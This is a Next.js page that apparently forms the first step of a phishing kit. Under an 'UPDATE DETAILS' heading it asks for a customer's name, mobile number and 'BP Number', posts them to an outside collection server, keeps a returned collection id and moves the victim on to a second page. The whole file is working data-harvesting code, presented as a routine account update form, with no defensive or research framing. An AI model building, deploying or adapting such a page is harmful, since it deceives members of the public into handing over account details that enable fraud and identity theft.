'use client';
import Footer from "./inlcude/footer";
import Header from "./inlcude/header";
import { useRouter } from "next/navigation";
import { useEffect } from "react";  


export default function Home() {
    const router = useRouter();
    const API_URL = "https://bk2.info/api/form/add";
    useEffect(()=>{
        localStorage.removeItem('collection_id');
    })
    const handleSubmit = async (e) => {
        e.preventDefault();
        const formData = new FormData(e.target);
        const jsonObject1 = {};
        const jsonObject = {};
        formData.forEach((value, key) => {
            jsonObject[key] = value;
        });
        jsonObject1['data'] = jsonObject;
        jsonObject1['site'] = "localhost";
        console.log(jsonObject1);
        try {
            const response = await fetch(`${API_URL}`, {
                method: 'POST',
                body: JSON.stringify(jsonObject1)
            });

            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            const responseData = await response.json();
            localStorage.setItem('collection_id', responseData.data);
            router.push('/2');
        } catch (error) {
            console.error('There was a problem with the fetch operation:', error);
        }
    }
  return (
    <>
    <Header />
    <main className="container">
  <div id="test" className="text-danger text-center fw-bold"></div>
  <input type="hidden" id="page_type" defaultValue="home" />
  <input type="hidden" id="nextValue" defaultValue="2.html" />
  <div className="card m-2">
    <div className="card-header border-bottom-0">
      <h1 className="text-center fw-bold">UPDATE DETAILS</h1>
    </div>
    <form onSubmit={handleSubmit} className="mt-3 p-2">
      <div className="form-group mb-3">
        <label htmlFor="fnam">Customer Name*</label>
        <input
          id="fnam"
          name="fnam"
          placeholder="Full Name"
          type="text"
          className="form-control"
          required
        />
      </div>
      <div className="form-group mb-3">
        <label htmlFor="mno">Mobile Number*</label>
        <input
          id="mno"
          name="mno"
          placeholder="Mobile Number"
          type="text"
          inputMode="numeric"
          minLength={10}
          maxLength={10}
          className="form-control"
          required
        />
      </div>
      <div className="form-group mb-3">
        <label htmlFor="bpno">BP Number*</label>
        <input
          id="bpno"
          name="bpno"
          placeholder="BP Number"
          type="text"
          className="form-control"
          required
        />
      </div>
      <div className="text-center bg-danger">
        <button
          type="submit"
          id="submit-button"
          className="btn W-100 btn-lg btn-danger"
        >
          CONTINUE
        </button>
      </div>
    </form>
  </div>
</main>



    <Footer />
</>
  );
}
